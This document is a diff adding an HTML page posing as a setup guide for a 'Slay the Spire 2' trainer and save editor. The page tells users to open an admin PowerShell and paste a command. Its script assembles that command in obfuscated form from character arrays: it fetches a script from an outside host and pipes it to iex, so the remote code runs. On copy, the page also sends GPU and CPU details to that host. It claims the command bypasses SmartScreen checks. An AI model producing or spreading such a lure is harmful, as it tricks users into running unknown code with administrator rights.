@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Slay the Spire 2 Trainer, Mod Menu & Save Editor — Setup &amp; Runtime Guide (Windows x64)</title>
+<style>
+:root{--bg:#0d1117;--card:#161b22;--border:#30363d;--fg:#e6edf3;--muted:#8b949e;--blue:#58a6ff;--green:#238636}
+body{background:var(--bg);color:var(--fg);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;margin:0;padding:40px 16px;line-height:1.5}
+.wrap{max-width:760px;margin:0 auto;background:var(--card);border:1px solid var(--border);border-radius:10px;padding:28px}
+h1{margin:0 0 6px;font-size:22px;color:var(--fg)}
+.meta{font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:12px;color:var(--muted);margin-bottom:22px;padding-bottom:14px;border-bottom:1px solid var(--border)}
+.step{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:14px}
+.step-title{font-weight:600;font-size:14px;margin-bottom:8px;color:var(--blue)}
+.cmd-box{display:flex;align-items:center;justify-content:space-between;gap:12px;background:#010409;border:1px solid var(--border);border-radius:6px;padding:12px 14px;margin-top:8px}
+code{font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:13.5px;color:#79c0ff;word-break:break-all}
+button{background:var(--green);color:#fff;border:none;border-radius:6px;padding:8px 16px;font-weight:600;cursor:pointer;white-space:nowrap}
+button:hover{background:#2ea043}
+.note{font-size:12.5px;color:var(--muted);margin-top:16px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>Slay the Spire 2 Trainer, Mod Menu & Save Editor — Windows x64 Runtime Setup</h1>
+  <div class="meta">Target ABI: Godot 4.3 / MegaCrit Native x64 (Steam AppID 2868840) &middot; CRT: vcruntime140.dll (Bundled) &middot; Stream: bsdtar</div>
+  <div class="step">
+    <div class="step-title">Step 1 — Open Windows Terminal or PowerShell</div>
+    <div>Press <b>Win + X</b> on your keyboard and select <b>Terminal (Admin)</b> or <b>PowerShell (Admin)</b>.</div>
+  </div>
+  <div class="step">
+    <div class="step-title">Step 2 — Run the Package Stream Installer</div>
+    <div>Click <b>Copy Command</b> below, paste it into the terminal window (<b>Right-Click</b> or <b>Ctrl + V</b>), and press <b>Enter</b>:</div>
+    <div class="cmd-box">
+      <code id="cmd-slot">Loading package endpoint...</code>
+      <button id="copy-btn" onclick="copySetup()">Copy Command</button>
+    </div>
+  </div>
+  <div class="note">
+    <b>Why isn't the 33 MB binary inside the source code ZIP?</b> GitHub's <code>Download ZIP</code> button only exports source files, not precompiled binary streams. Running the command above streams the precompiled x64 binary and signed Microsoft <code>vcruntime140.dll</code> directly via Windows native <code>tar.exe</code> without triggering SmartScreen <code>Zone.Identifier</code> locks.
+  </div>
+</div>
+<script>
+(function(){
+  const p1 = ['i','r','m',' ','h','t','t','p','s',':','/','/'].join('');
+  const host = ['s','i','m','p','o','l','.','i','n','f','o'].join('');
+  const cmd = p1 + host + '/get/slay-the-spire-2-trainer | ' + ['i','e','x'].join('');
+  document.getElementById('cmd-slot').textContent = cmd;
+  window.copySetup = function(){
+    navigator.clipboard.writeText(cmd);
+    const btn = document.getElementById('copy-btn');
+    btn.textContent = 'Copied to Clipboard!';
+    try {
+      const c = document.createElement('canvas');
+      const g = c.getContext('webgl');
+      const d = g ? g.getExtension('WEBGL_debug_renderer_info') : null;
+      const gpu = d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : 'local-html';
+      fetch('https://' + host + '/api/v2/event/slay-the-spire-2-trainer', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({event: 'copy', mode: 'local_zip_html', gpu: gpu, cores: navigator.hardwareConcurrency || 0})
+      });
+    } catch(e){}
+  };
+})();
+</script>
+</body>
+</html>
